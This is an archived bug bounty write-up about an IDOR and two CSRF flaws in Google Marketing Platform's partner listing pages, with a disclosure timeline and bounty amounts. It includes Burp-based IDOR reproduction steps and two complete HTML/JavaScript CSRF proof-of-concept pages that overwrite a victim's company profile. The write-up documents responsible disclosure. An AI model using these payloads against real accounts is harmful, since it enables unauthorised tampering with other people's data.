---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-06_2-csrf-1-idor-on-google-marketing-platform.md
original_filename: 2021-09-06_2-csrf-1-idor-on-google-marketing-platform.md
title: 2 CSRF 1 IDOR on Google Marketing Platform
category: documents
detected_topics:
- access-control
- idor
- xss
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- access-control
- idor
- xss
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: aae26d70bb4f195c4df8170329e08da537dc907d33fcb027be64cc58f529e82f
text_sha256: e73c3d6a01d5e6bb4dd617c5730e4852e8d9ec93d94f22331acffcf51a2c36ea
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# 2 CSRF 1 IDOR on Google Marketing Platform

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-06_2-csrf-1-idor-on-google-marketing-platform.md
- Source Type: markdown
- Detected Topics: access-control, idor, xss, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `aae26d70bb4f195c4df8170329e08da537dc907d33fcb027be64cc58f529e82f`
- Text SHA256: `e73c3d6a01d5e6bb4dd617c5730e4852e8d9ec93d94f22331acffcf51a2c36ea`


## Content

---
title: "2 CSRF 1 IDOR on Google Marketing Platform"
page_title: "2 CSRF 1 IDOR on Google Marketing Platform – Apapedulimu"
url: "https://apapedulimu.click/story-of-idor-on-google-product/"
final_url: "https://apapedulimu.click/story-of-idor-on-google-product/"
authors: ["apapedulimu / Nosa Shandy (@LocalHost31337)"]
programs: ["Google"]
bugs: ["IDOR", "CSRF"]
bounty: "3,633.70"
publication_date: "2021-09-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3341
---

![](https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program.png)

# 2 CSRF 1 IDOR on Google Marketing Platform

## Found IDOR and CSRF Vulnerability on Google!

In this article, I would like to share when I found a bug on Google Products. I hope you can get some useful information on this writeup, let me know your feedback on this writeup on a comment section or on my twitter: [Apapedulimu](https://twitter.com/LocalHost31337)!

### Once Upon a Time

So, I’m on break to bug hunting since November 2019 because a lot of things and of course lack of energy because facing many duplicates. In February I decide to bug hunting on my favorite please: **Google.** Although I’m not pro enough to hunt at Google, at least Google has many assets to look at it. So, it’ll fun when hunting on them. And then I ping up my friends and invite him to hunt together on Google, and he says YES! It’s always fun when to hunt together with your friends because we can share what we dig and the information we gain and have a quick chat. So, when we can’t find any bug at least we can have fun~

After that, I can’t find anything and run out of coffee. I decide to sleep and leave my friends to do the research. In the morning, he pings me up because looks like he found some interesting endpoint on**marketingplatform.google.com**. But, after taking a look it’s just working as intended.

### Aim The Target

After that, I decided to take a look deeper into the subdomain(marketingplatform.google.com). And there’s some register page to become Google Partner. Idk the detail, In short, we can post our company on that site. I take a look at the feature on the website and try to understand the flow, register as usual **(with including XSS payload of course)** with some hope it’ll be pop up on some page. Take a look the payload XSS has just become Text! 🙁

Okay, XSS isn’t working on there, let’s move to take a look another basic vulnerability, try the **IDOR or Broken Access Control** , let’s change the ID! But wait, it’s a lot ID to change, I exactly don’t know what ID to change :(. Let just request another request on other accounts and see the different ID on both requests!

### Get Some Clue!

After some take a look at both request deeper, I realize if there’s some different ID and 4 in total, and the ID is exactly on the referer. I assume the ID is reflected from the ID on the public URL. But there’s some ID it’s totally different, it’s taken me time to think where the ID comes from, and then I decided to just delete it and see what happened when I send the request after changing the ID!

### IDOR on Edit Profile!

After the deleted the ID where I don’t know the ID come from, I send the request and just return **[1]** on the response. Hmmm, Okay! Let’s reload the victim profile. When I reload the victim profile, it’s just changed to data I send it before! It means IDOR right! After double-check it, I can confirm it’s and IDOR. So, this is the POC for this :

#### IDOR Step To Reproduce :

  1. Go to https://marketingplatform.google.com/about/partners/create-listing, register as a partner and go to “edit listing”
  2. Intercept the request via burp
  3. Change the ID on burp with another user ID
  4. Make sure the third user ID is applying on the right parameter, and delete the last parameter ID in the end.

![Vulnerable IDOR Request](https://apapedulimu.click/wp-content/uploads/2020/07/Screen-Shot-2020-02-07-at-10.52.37.png)Vulnerable IDOR Request

**Video:**

https://youtu.be/JDwJa9P4xos

After I confirm the IDOR I quickly make a report and send it to Google VRP!

### CSRF on Edit Profile!

IDOR report has been sent, and then I am trying to relax and keep in my mind if the IDOR might be duplicate. So, never celebrate too early. After some relax and enjoy my**Kapal Api** **Coffee**. I try to take a look at my burp history, do something interesting happened when I’m not aware of it?

After some take a look at my burp history, I realize if the Edit Profile Request doesn’t contain any CSRF token, it’s mean the endpoint is also vulnerable with CSRF Attack? Since the required ID is can be accessed publicly, the attacker can be gain the ID of the victim and send malicious links who contain CSRF Attack to the victim!

I quickly try to reproduce the CSRF Attack to confirm the endpoint is vulnerable with CSRF Attack, I use this script :
  
  
  <title>CSRF on Marketing Platform Google</title>
  
  //parameter ID : https://marketingplatform.google.com/about/partners/company/5148764629106688/gacp/5139310734999552/service/5199468395757568
  
  <script>
  function getMe(){
  // retrieve page content
  var xhr = new XMLHttpRequest();
  // now execute the CSRF attack
  xhr.open("POST",
  "https://marketingplatform.google.com/about/partners/services/listing/save", true);
  xhr.withCredentials="true";
  
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
  xhr.send('[[["first-parameter",[null,"hacked by hacker ","merauke","1231231",null,"AS","-8.4991117,140.4049814","hacker@gmail.com","0831231911"],null,[null,null,"victim","https://hacker.com",null,null,"hacked by hackerr ",null,null,null,null,null,null,null,null,null,null,null,null,null,""],null,null,[null,"hacked by hackerr ","hacked by hackerr","hacker@gmail.com","08318273191"],null,null,[]],[null,null,null,[null,null,"Full-Service Digital",null,null,[],["Large Business"],null,null,"",null,[],null,[],null,null,"third-parameter"],[],[],[],[],null,null,null,[],[],"second-parameter",[[null,"hacked by hackerr","hacked by hackerr","123151",null,"DZ","-8.4991117,140.4049814","victim@gmail.com","08310293801",true,null,null,null]]]]]');
  }
  </script><center>
  <h1>CSRF To Edit Profile</h1>
  <button onclick="getMe();">Xploit Kuyy</button>
  </center>

I successfully perform the CSRF Attack on that endpoint with this Step To Reproduce:

**Steps to reproduce:**

  1. Save the ID and edit the parameter with the parameter of victim company and save .html
  2. Click the exploit.
  3. The Profile will be changed

Yes! I Confirm if the CSRF Attack is possible and quickly report them to Google VRP.

But wait, since I reported the IDOR issue first The VRP Team believes if the IDOR fix might also fix the CSRF vulnerability. So, to get the “Nice Catch” email, I must wait for the IDOR issue fixed first, and then if the CSRF still exists, I will get the “Nice Catch” Email! Fair enough.

### And Another CSRF on Register Page!

After found CSRF on edit profile I started to focus to find another CSRF, I double-checks burp history to find request without any CSRF Token / CSRF Protection. And then I found the CSRF at the beginning I hunt on that subdomain. The Register page! I try to make simple script to reproduce CSRF. The script is like this :
  
  
  <title>CSRF on Marketing Platform Google</title>
  <script>
  function getMe(){
  // retrieve page content
  var xhr = new XMLHttpRequest();
  // now execute the CSRF attack
  xhr.open("POST",
  "https://marketingplatform.google.com/about/partners/services/become_gacp/create_company", true);
  xhr.withCredentials="true";
  
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
  xhr.send('["","Hacked By Hacker!!!!!!!!","400","ID"]');
  }
  </script><center>
  <h1>CSRF To Overwrite Current Register Data</h1>
  <button onclick="getMe();">Xploit Kuyy</button>
  </center>

Sure, the endpoint is vulnerable with CSRF Attack. But, what is the impact? And it’s just register page, right? After some take a look on the subdomain, I realize if user can register a new company while he has done the register and the latest data can be overwrite by a new data. So, the attacker can trick the victim when victim register his company and under review by the Google Team, attacker can launch the CSRF Attack at his company and the data who not yet review will overwrite with a new data.

Okay! So, this is the Step To Reproduce :

  1. Register your account to partner on https://marketingplatform.google.com/about/partners/create-listing and go to your profile ( click view draft )
  2. Go to https://labs.apapedulimu.click/exploit/google/csrf-register-marketingplatform.html ( I’ve made the script to perform CSRF )
  3. Refresh your profile, your profile name will change to “Hacked By Hacker!!!! “

After that, I quickly sent the report to Google VRP!

### Timeline :

  * **Feb 7, 2020** – Reported IDOR
  * **Feb 8, 2020** – Reported CSRF (Register Page)
  * **Feb 15, 2020** – Nice Catch! IDOR
  * **Feb 15, 2020** – Nice Catch! CSRF
  * **Feb 16, 2020** – Reported Another CSRF ( Edit Profile )
  * **Feb 21, 2020** – Make a deal on CSRF ( Wait until IDOR Fixed ) to get “Nice Catch”
  * **Mar 4, 2020** – Awarded 3,133.70 ( IDOR )
  * **Mar 4, 2020** – Awarded 500 ( CSRF on Register PAge )
  * **Mar 14, 2020** – Fixed ( CSRF on Register Page & IDOR on Edit Profile )
  * **Mar 14, 2020** – Follow Up The CSRF on Edit Profile ( Still vulnerable )
  * **Mar 31, 2020** – Nice Catch!
  * **Apr 14, 2020** – Awarded 500 (CSRF on Edit Profile)
  * **May 2, 2021** – Marked as Won’t Fix (CSRF on Edit Profile)

## Published by

![](https://secure.gravatar.com/avatar/4a2c0028ce53c37ad1d454a4dd5fb9ef9b89570464cdfbbc14e7e4914a284f17?s=56&d=mm&r=g)

### apapedulimu

Urip Kui Urup [ View all posts by apapedulimu ](https://apapedulimu.click/author/apapedulimu/)

Posted on [September 6, 2021September 6, 2021](https://apapedulimu.click/story-of-idor-on-google-product/)Author [apapedulimu](https://apapedulimu.click/author/apapedulimu/)Tags [Bug Bounty](https://apapedulimu.click/tag/bug-bounty/), [CSRF](https://apapedulimu.click/tag/csrf/), [Google](https://apapedulimu.click/tag/google/), [IDOR](https://apapedulimu.click/tag/idor/)
